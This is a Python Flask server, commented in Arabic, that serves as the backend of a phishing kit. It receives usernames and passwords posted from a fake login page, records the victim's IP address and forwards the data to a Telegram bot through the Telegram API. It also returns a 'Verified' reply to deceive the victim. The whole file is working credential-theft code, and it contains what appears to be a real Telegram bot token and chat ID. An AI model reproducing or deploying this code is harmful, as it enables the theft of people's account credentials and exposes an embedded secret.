from flask import Flask, request, jsonify
import requests
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # لضمان قبول الطلبات من أي موقع (مثل GitHub Pages)

# --- إعداداتك السرية (مخفية عن الضحية) ---
BOT_TOKEN = '8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg'
CHAT_ID = '5811700860'

@app.route('/capture', methods=['POST'])
def capture_data():
    try:
        # استقبال البيانات من صفحة الـ HTML
        data = request.json
        user = data.get('username')
        password = data.get('password')
        platform = data.get('platform', 'Unknown')
        user_ip = request.remote_addr # سحب الـ IP الخاص بالضحية من السيرفر

        # تجهيز الرسالة بشكل احترافي
        message = (
            f"🎯 **صيد جديد عبر الـ API**\n"
            f"━━━━━━━━━━━━━━\n"
            f"👤 الحساب: `{user}`\n"
            f"🔑 الباسورد: `{password}`\n"
            f"📱 النظام: {platform}\n"
            f"🌐 IP: `{user_ip}`\n"
            f"━━━━━━━━━━━━━━"
        )

        # إرسال البيانات للتليجرام
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
        requests.post(url, json=payload)

        return jsonify({"status": "success", "message": "Verified"}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
